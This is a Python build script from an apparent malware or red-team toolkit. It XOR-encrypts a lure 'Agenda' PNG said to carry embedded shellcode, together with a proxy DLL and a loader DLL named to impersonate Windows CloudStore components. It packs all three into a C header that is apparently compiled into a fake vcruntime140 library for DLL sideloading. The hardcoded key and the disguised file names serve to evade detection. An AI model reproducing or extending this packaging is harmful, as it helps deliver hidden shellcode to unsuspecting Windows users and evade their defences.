#!/usr/bin/env python3
"""XOR-encrypt Agenda PNG + proxy DLL + loader into data.h for vcruntime140.c."""

from __future__ import annotations

import sys
from pathlib import Path

STAGE = Path(__file__).resolve().parent
REPO = STAGE.parent.parent
WORKDIR = Path.cwd()
PNG_PATH = REPO / "cloudstore" / "Agenda_15-19_6-2026.png"
PROXY_PATH = WORKDIR / "Windows.CloudStore.Schema.Shell.dll"
LOADER_PATH = WORKDIR / "Windows.CloudStore.dll"
OUT_PATH = STAGE / "data.h"

ck2 = b"9832gf2bc29_120e9hd10c))b@@!11"
ck2l = 30


def bin_to_c_enc(data: bytes, name: str) -> str:
    enc_data = bytearray(b ^ ck2[i % ck2l] for i, b in enumerate(data))
    res = f"unsigned char {name}[] = {{\n"
    for i in range(0, len(enc_data), 16):
        chunk = enc_data[i : i + 16]
        res += "    " + ", ".join(f"0x{x:02x}" for x in chunk) + ",\n"
    res += "};\n"
    res += f"unsigned int {name}_len = {len(data)};\n"
    return res


def main() -> int:
    inputs = (
        ("PNG", PNG_PATH),
        ("proxy DLL", PROXY_PATH),
        ("loader DLL", LOADER_PATH),
    )
    for label, path in inputs:
        if not path.is_file():
            print(f"error: missing {label}: {path}", file=sys.stderr)
            if label != "PNG":
                print(
                    "hint: run from STAGE with Windows.CloudStore.Schema.Shell.dll "
                    "and Windows.CloudStore.dll in the current directory",
                    file=sys.stderr,
                )
            else:
                print(
                    "hint: run embedShellcode.py in cloudstore/ to build Agenda PNG",
                    file=sys.stderr,
                )
            return 1

    png_data = PNG_PATH.read_bytes()
    proxy_data = PROXY_PATH.read_bytes()
    loader_data = LOADER_PATH.read_bytes()
    if not png_data or not proxy_data or not loader_data:
        print("error: empty payload input", file=sys.stderr)
        return 1

    OUT_PATH.write_text(
        bin_to_c_enc(png_data, "file_sys")
        + bin_to_c_enc(proxy_data, "file_dll")
        + bin_to_c_enc(loader_data, "file_loader")
    )
    print(
        f"wrote {OUT_PATH} (png={len(png_data)} proxy={len(proxy_data)} "
        f"loader={len(loader_data)} bytes)"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
